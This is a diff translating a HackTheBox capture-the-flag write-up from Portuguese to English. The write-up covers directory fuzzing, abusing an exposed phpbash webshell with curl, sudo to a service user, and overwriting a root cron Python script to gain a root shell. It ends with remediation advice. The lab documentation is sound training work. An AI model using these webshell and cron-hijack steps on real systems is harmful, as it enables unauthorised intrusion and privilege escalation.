@@ -5,11 +5,11 @@ categories: [Machines, HackTheBox]
 tags: [hackthebox, linux, webshell, ffuf, cron, privesc, easy]
 ---
 
-**IP:** 10.129.34.106 | **Dificuldade:** Easy | **OS:** Linux (Ubuntu) | **Autor:** Arrexel
+**IP:** 10.129.34.106 | **Difficulty:** Easy | **OS:** Linux (Ubuntu) | **Author:** Arrexel
 
-## Resumo
+## Summary
 
-Máquina focada em fuzzing web e localização de arquivos expostos. O vetor de entrada é um webshell PHP (`phpbash`) deixado em um diretório de desenvolvimento. A escalada para root explora um cron job rodando como root que executa scripts Python de um diretório onde o usuário intermediário tem permissão de escrita.
+Web fuzzing machine focused on finding exposed files. The entry point is a PHP webshell (`phpbash`) left in a development directory. Privilege escalation exploits a cron job running as root that executes Python scripts from a directory where the intermediate user has write access.
 
 | Flag | Hash |
 |------|------|
@@ -18,7 +18,7 @@ Máquina focada em fuzzing web e localização de arquivos expostos. O vetor de 
 
 ---
 
-## 1. Reconhecimento
+## 1. Reconnaissance
 
 ```bash
 nmap -sV -sC -T4 -Pn 10.129.34.106 -oA nmap/initial
@@ -31,7 +31,7 @@ PORT   STATE SERVICE VERSION
 
 ---
 
-## 2. Enumeração Web
+## 2. Web Enumeration
 
 ```bash
 ffuf -w ~/ctf/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt \
@@ -39,12 +39,12 @@ ffuf -w ~/ctf/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.t
 ```
 
 ```
-dev             [301]  ← ALVO
+dev             [301]  ← TARGET
 uploads         [301]
 php             [301]
 ```
 
-O diretório `/dev` contém uma cópia funcional do **phpbash** — webshell interativo sem autenticação:
+The `/dev` directory contains a working copy of **phpbash** — an interactive webshell with no authentication:
 
 ```bash
 curl -s http://10.129.34.106/dev/phpbash.php --data "cmd=whoami"
@@ -71,7 +71,7 @@ cat /home/arrexel/user.txt
 
 ---
 
-## 4. Escalada de Privilégios
+## 4. Privilege Escalation
 
 ### www-data → scriptmanager (sudo NOPASSWD)
 
@@ -85,10 +85,10 @@ sudo -l
 ```bash
 sudo -u scriptmanager ls -la /scripts/
 # -rw-r--r-- 1 scriptmanager scriptmanager   58 Dec  4 2017 test.py
-# -rw-r--r-- 1 root          root            12 May 13 14:14 test.txt  ← modificado por root
+# -rw-r--r-- 1 root          root            12 May 13 14:14 test.txt  ← updated by root
 ```
 
-`test.txt` é atualizado a cada minuto pelo root via cron — logo `test.py` é executado como root. Basta sobrescrever o script:
+`test.txt` gets a fresh timestamp every minute — root is running `test.py` via cron. Overwrite it:
 
 ```bash
 sudo -u scriptmanager python -c "
@@ -101,7 +101,7 @@ open('/scripts/test.py','w').write(
 )"
 ```
 
-Após até 1 minuto o cron executa `test.py` como root → shell root recebida.
+Within a minute the cron fires `test.py` as root → root shell received.
 
 ```bash
 cat /root/root.txt
@@ -110,22 +110,22 @@ cat /root/root.txt
 
 ---
 
-## Diagrama
+## Attack Chain
 
 ```
-ffuf → /dev/phpbash.php (webshell sem auth)
+ffuf → /dev/phpbash.php (unauthenticated webshell)
   ↓ curl POST cmd= → www-data reverse shell
   ↓ sudo -u scriptmanager (NOPASSWD:ALL)
-  ↓ /scripts/test.py sobrescrito → cron root executa
+  ↓ overwrite /scripts/test.py → cron executes as root
   ↓ root shell
 ```
 
 ---
 
-## Lições Aprendidas
+## Lessons Learned
 
-| Vulnerabilidade | Remediação |
-|-----------------|------------|
-| Webshell exposto em `/dev` sem autenticação | Nunca deixar ferramentas de dev em produção |
-| sudo NOPASSWD para usuário de serviço | Restringir sudo ao mínimo necessário |
-| Cron root executando scripts em dir editável | Scripts de root devem ter permissão 700 e pertencer ao root |
+| Vulnerability | Remediation |
+|---------------|-------------|
+| Dev webshell exposed in `/dev` with no auth | Never leave development tools in production |
+| sudo NOPASSWD for service user | Restrict sudo to the minimum required |
+| Root cron running scripts in user-writable dir | Script directories owned by root with mode 700 |
